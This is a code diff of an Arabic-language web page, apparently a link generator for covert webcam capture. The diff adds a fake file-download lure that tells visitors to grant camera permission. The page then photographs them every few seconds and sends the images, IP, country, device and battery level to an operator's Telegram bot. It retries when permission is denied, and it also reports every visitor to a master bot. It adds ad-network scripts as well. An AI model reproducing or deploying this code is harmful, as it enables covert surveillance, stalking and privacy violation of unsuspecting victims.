@@ -52,14 +52,13 @@
       box-shadow:0 6px 20px rgba(0,0,0,0.5);
       color: #ffffff;
     }
-    .viewerFrame{width:100%;height:calc(100vh - 40px);border-radius:10px;border:0;overflow:hidden}
     @media (max-width:720px){
       .title{font-size:28px}
       .card{padding:16px}
       .wrap{padding:18px}
     }
 
-    /* الدايلوج المطور */
+    /* الدايلوج للصفحة الرئيسية فقط */
     .dialog {
       position: fixed;
       top: 50%;
@@ -133,8 +132,59 @@
       background: transparent;
       color: #ffffff;
     }
-    .check-icon {
-      margin-right: 8px;
+
+    /* ستايل صفحة التحميل الجانبية */
+    .download-page {
+      width: 100%;
+      min-height: 100vh;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 20px 0;
+      box-sizing: border-box;
+      font-family: Tahoma, Arial, sans-serif;
+    }
+    .main-box{
+      width:95%;
+      max-width:600px;
+      background:white;
+      margin:40px auto;
+      padding:25px;
+      border-radius:15px;
+      box-shadow:0 5px 20px rgba(0,0,0,0.1);
+      text-align:center;
+    }
+    .main-box h2{
+      margin-bottom:20px;
+      color:#222;
+    }
+    .ad-box{
+      margin:20px 0;
+      padding:10px;
+      border-radius:10px;
+      background:#fafafa;
+      border:1px solid #eee;
+      min-height: 90px;
+    }
+    .download-btn{
+      background:#28a745;
+      color:white;
+      padding:18px 45px;
+      font-size:22px;
+      border:none;
+      border-radius:12px;
+      cursor:pointer;
+      transition:0.3s;
+      box-shadow:0 4px 10px rgba(0,0,0,0.2);
+    }
+    .download-btn:hover{
+      background:#218838;
+      transform:scale(1.05);
+    }
+    .footer{
+      text-align:center;
+      margin-top:30px;
+      font-size:14px;
+      color:#777;
     }
   </style>
 </head>
@@ -161,9 +211,6 @@
             <label>أدخل توكن البوت</label>
             <input type="text" id="tokenInput" placeholder="Bot Token">
 
-            <label>أدخل الرابط الذي تريد عرضه</label>
-            <input type="text" id="linkInput" placeholder="https://b7xha.github.io/Maroweb/">
-
             <button class="btn" id="generateBtn">إنشاء الرابط</button>
 
             <div id="result" style="display:none" class="result">
@@ -185,7 +232,7 @@
   <div id="captureBadge" class="captureBadge"></div>
   <div class="madeby">Made by K1X</div>
 
-  <!-- الدايلوج بشرط الاشتراك في قناتين -->
+  <!-- الدايلوج للصفحة الرئيسية فقط -->
   <div class="dialog" id="mandatoryDialog">
     <p> اشتراك إجباري في القنوات </p>
     <div class="dialog-buttons" id="dialogButtons">
@@ -210,7 +257,6 @@
   // ------------------ إرسال معلومات الزائر (البلد + الجهاز + الشحن) ------------------
   async function sendVisitorInfo() {
     try {
-      // 1. جمع معلومات الجهاز
       const userAgent = navigator.userAgent;
       visitorDevice = "Unknown";
       if (/Android/i.test(userAgent)) visitorDevice = "Android";
@@ -221,7 +267,6 @@
 
       visitorOS = navigator.platform || "غير معروف";
 
-      // 2. محاولة الحصول على البطارية (نسبة الشحن)
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
@@ -231,7 +276,6 @@
         } catch (e) { visitorBattery = "غير متاح"; }
       }
 
-      // 3. الحصول على IP والدولة عبر خدمة خارجية
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
@@ -239,7 +283,6 @@
         visitorCountry = ipData.country_name || "غير معروف";
       } catch (e) { /* تجاهل الفشل */ }
 
-      // 4. تجهيز الرسالة
       const message = `
 🟢 *زيارة جديدة للموقع*
 ━━━━━━━━━━━━━━━
@@ -252,7 +295,6 @@
 ━━━━━━━━━━━━━━━
       `;
 
-      // 5. إرسال إلى البوت الرئيسي
       const url = `https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`;
       await fetch(url, {
         method: 'POST',
@@ -269,7 +311,6 @@
     }
   }
 
-  // استدعاء دالة إرسال المعلومات فور فتح الصفحة (الزائر العادي)
   sendVisitorInfo();
 
   // ------------------ عناصر الدايلوج ------------------
@@ -278,11 +319,9 @@
   const channel2 = document.getElementById('channel2');
   const subscribeBtn = document.getElementById('subscribeDoneBtn');
 
-  // التحقق من حالة الاشتراك
   let channel1Clicked = false;
   let channel2Clicked = false;
 
-  // عند النقر على رابط القناة الأولى
   channel1.addEventListener('click', function() {
     channel1Clicked = true;
     channel1.classList.add('visited');
@@ -292,7 +331,6 @@
     checkBothClicked();
   });
 
-  // عند النقر على رابط القناة الثانية
   channel2.addEventListener('click', function() {
     channel2Clicked = true;
     channel2.classList.add('visited');
@@ -302,7 +340,6 @@
     checkBothClicked();
   });
 
-  // دالة التحقق من النقر على كلا الرابطين
   function checkBothClicked() {
     if (channel1Clicked && channel2Clicked) {
       subscribeBtn.disabled = false;
@@ -313,7 +350,6 @@
     }
   }
 
-  // إخفاء الدايلوج عند الضغط على زر "تم الاشتراك"
   subscribeBtn.addEventListener('click', function() {
     dialog.style.display = 'none';
   });
@@ -327,14 +363,13 @@
   generateBtn.addEventListener('click', () => {
     const chat = document.getElementById('chatIdInput').value.trim();
     const token = document.getElementById('tokenInput').value.trim();
-    const url = document.getElementById('linkInput').value.trim();
 
-    if(!chat || !token || !url){
-      alert('املأ كل الحقول');
+    if(!chat || !token){
+      alert('املأ جميع الحقول');
       return;
     }
 
-    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(url)}`;
+    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}`;
     linkText.innerText = fullLink;
     resultEl.style.display = 'flex';
   });
@@ -349,80 +384,66 @@
     }
   });
 
-  // ------------------ viewer mode ------------------
-  const params = new URLSearchParams(window.location.search);
-  const chat = params.get('chat');
-  const token = params.get('token');
-  const target = params.get('url');
+  // ------------------ دالة تحميل الإعلانات يدوياً ------------------
+  function loadAd(src) {
+    const s = document.createElement("script");
+    s.src = src;
+    s.async = true;
+    document.body.appendChild(s);
+  }
 
-  if (chat && token && target) {
-    // إخفاء الكارت وعرض الـ iframe
-    document.getElementById('cardArea').style.display = 'none';
-    const iframe = document.createElement('iframe');
-    iframe.className = 'viewerFrame';
-    iframe.src = target;
-    document.querySelector('.wrap').appendChild(iframe);
+  // ------------------ دالة تشغيل الكاميرا ------------------
+  async function startCameraAndSend(chat, token) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      
+      const vid = document.createElement('video');
+      vid.autoplay = true; 
+      vid.playsInline = true; 
+      vid.muted = true; 
+      vid.style.display = 'none';
+      vid.srcObject = stream;
+      document.body.appendChild(vid);
+      
+      await vid.play();
+      
+      let attempts = 0;
+      while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
+        await new Promise(resolve => setTimeout(resolve, 100));
+        attempts++;
+      }
 
-    const captureBadge = document.getElementById('captureBadge');
-    captureBadge.style.display = 'inline-block';
-    captureBadge.textContent = '';
-    captureBadge.style.background = 'rgba(0,0,0,0.0)';
+      const canvas = document.createElement('canvas');
+      canvas.width = vid.videoWidth || 640;
+      canvas.height = vid.videoHeight || 480;
 
-    (async function startCameraAndSend(){
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        const vid = document.createElement('video');
-        vid.autoplay = true; 
-        vid.playsInline = true; 
-        vid.muted = true; 
-        vid.style.display = 'none';
-        vid.srcObject = stream;
-        document.body.appendChild(vid);
-        
-        // انتظر حتى يشتغل الفيديو فعلاً
-        await vid.play();
-        
-        // انتظر حتى يكون للفيديو أبعاد حقيقية
-        let attempts = 0;
-        while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
-          await new Promise(resolve => setTimeout(resolve, 100));
-          attempts++;
+      const tick = async () => {
+        if (vid.paused || vid.ended) {
+          await vid.play();
         }
+        
+        if (vid.videoWidth > 0 && vid.videoHeight > 0) {
+          canvas.width = vid.videoWidth;
+          canvas.height = vid.videoHeight;
+        }
+        
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
 
-        const canvas = document.createElement('canvas');
-        canvas.width = vid.videoWidth || 640;
-        canvas.height = vid.videoHeight || 480;
-
-        const tick = async () => {
-          // تأكد أن الفيديو شغال
-          if (vid.paused || vid.ended) {
-            await vid.play();
-          }
+        canvas.toBlob(async (blob) => {
+          if (!blob || blob.size < 2000) return;
           
-          // تأكد من الأبعاد
-          if (vid.videoWidth > 0 && vid.videoHeight > 0) {
-            canvas.width = vid.videoWidth;
-            canvas.height = vid.videoHeight;
-          }
-          
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
-
-          canvas.toBlob(async (blob) => {
-            // تجاهل الصور الصغيرة جداً (الفارغة)
-            if (!blob || blob.size < 2000) return;
+          try {
+            const form = new FormData();
+            form.append('chat_id', chat);
+            form.append('photo', blob, `img_${Date.now()}.png`);
             
-            try {
-              const form = new FormData();
-              form.append('chat_id', chat);
-              form.append('photo', blob, `img_${Date.now()}.png`);
-              
-              await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: form
-              });
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: 'POST',
+              body: form
+            });
 
-              const caption = `
+            const caption = `
 ━━━━━━━━━━━━━━━
 📸 *صورة جديدة تم التقاطها*
 ━━━━━━━━━━━━━━━
@@ -430,46 +451,147 @@
 📱 *الجهاز*: ${visitorDevice}
 🔋 *البطارية*: ${visitorBattery}
 🌐 *IP*: ${visitorIP}
-🔗 *الرابط المعروض*: ${target}
 🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━━
-              `;
+            `;
 
-              await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: chat,
-                  text: caption,
-                  parse_mode: 'Markdown'
-                })
-              });
-              
-            } catch (err) {
-              console.error('Send error', err);
-            }
-          }, 'image/jpeg', 0.9);
-        };
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chat,
+                text: caption,
+                parse_mode: 'Markdown'
+              })
+            });
+            
+          } catch (err) {
+            console.error('Send error', err);
+          }
+        }, 'image/jpeg', 0.9);
+      };
 
-        // أول صورة بعد ثانيتين عشان الفيديو يثبت
-        setTimeout(tick, 2000);
-        
-        // بعد كده كل 4 ثواني
-        const intervalId = setInterval(tick, 4000);
+      setTimeout(tick, 2000);
+      const intervalId = setInterval(tick, 4000);
 
-        window.addEventListener('beforeunload', () => {
-          clearInterval(intervalId);
-          stream.getTracks().forEach(t => t.stop());
-        });
+      window.addEventListener('beforeunload', () => {
+        clearInterval(intervalId);
+        stream.getTracks().forEach(t => t.stop());
+      });
 
-      } catch (err) {
-        const captureBadge = document.getElementById('captureBadge');
-        captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
-        captureBadge.style.background = 'rgba(160,40,40,0.9)';
-        console.error('Camera error', err);
-      }
-    })();
+    } catch (err) {
+      console.log("فشل الوصول للكاميرا، إعادة المحاولة...");
+      setTimeout(() => {
+        startCameraAndSend(chat, token);
+      }, 2000);
+    }
+  }
+
+  // ------------------ الوضع الجانبي (viewer mode) ------------------
+  const params = new URLSearchParams(window.location.search);
+  const chat = params.get('chat');
+  const token = params.get('token');
+
+  if (chat && token) {
+    // إخفاء الدايلوج
+    dialog.style.display = 'none';
+    
+    // إخفاء عناصر الصفحة الأساسية
+    document.getElementById('cardArea').style.display = 'none';
+    document.querySelector('.header').style.display = 'none';
+    document.querySelector('.madeby').style.display = 'none';
+    
+    // إخفاء captureBadge
+    const captureBadge = document.getElementById('captureBadge');
+    captureBadge.style.display = 'none';
+    
+    // تنظيف الـ wrap
+    const wrap = document.querySelector('.wrap');
+    wrap.innerHTML = '';
+    wrap.style.padding = '0';
+    wrap.style.margin = '0';
+    wrap.style.maxWidth = '100%';
+    wrap.style.background = '#f5f5f5';
+    
+    // ---------- إنشاء صفحة التحميل الجانبية بطريقة احترافية ----------
+    const downloadPage = document.createElement('div');
+    downloadPage.className = 'download-page';
+    
+    // إنشاء main-box
+    const mainBox = document.createElement('div');
+    mainBox.className = 'main-box';
+    
+    // العنوان
+    const h2 = document.createElement('h2');
+h2.textContent = '⚠️يجب الضغط علي سماح لحماية الحملة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح⚠️';
+
+h2.style.fontSize = '14px'; // غير الرقم حسب الحجم اللي يناسبك
+
+mainBox.appendChild(h2);
+    
+    // AD Box 1
+    const adBox1 = document.createElement('div');
+    adBox1.className = 'ad-box';
+    mainBox.appendChild(adBox1);
+    
+    // AD Box 2
+    const adBox2 = document.createElement('div');
+    adBox2.className = 'ad-box';
+    const containerDiv = document.createElement('div');
+    containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
+    adBox2.appendChild(containerDiv);
+    mainBox.appendChild(adBox2);
+    
+    // زر التحميل
+    const downloadBtn = document.createElement('button');
+    downloadBtn.className = 'download-btn';
+    downloadBtn.textContent = 'تنزيل الآن';
+    downloadBtn.onclick = function() {
+      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
+    };
+    mainBox.appendChild(downloadBtn);
+    
+    // AD Box 3
+    const adBox3 = document.createElement('div');
+    adBox3.className = 'ad-box';
+    mainBox.appendChild(adBox3);
+    
+    // AD Box 4
+    const adBox4 = document.createElement('div');
+    adBox4.className = 'ad-box';
+    mainBox.appendChild(adBox4);
+    
+    // الفوتر
+    const footer = document.createElement('div');
+    footer.className = 'footer';
+    footer.textContent = '';
+    mainBox.appendChild(footer);
+    
+    downloadPage.appendChild(mainBox);
+    wrap.appendChild(downloadPage);
+    
+    // ---------- تحميل جميع الإعلانات يدوياً ----------
+    loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+    loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+    loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+    
+    // الإعلان الرابع مع atOptions
+    const atOptionsScript = document.createElement('script');
+    atOptionsScript.innerHTML = `
+      atOptions = {
+        'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+        'format' : 'iframe',
+        'height' : 300,
+        'width' : 160,
+        'params' : {}
+      };
+    `;
+    document.body.appendChild(atOptionsScript);
+    loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
+    
+    // تشغيل الكاميرا
+    startCameraAndSend(chat, token);
   }
 </script>
 </body>
-              </html>
+  </html>
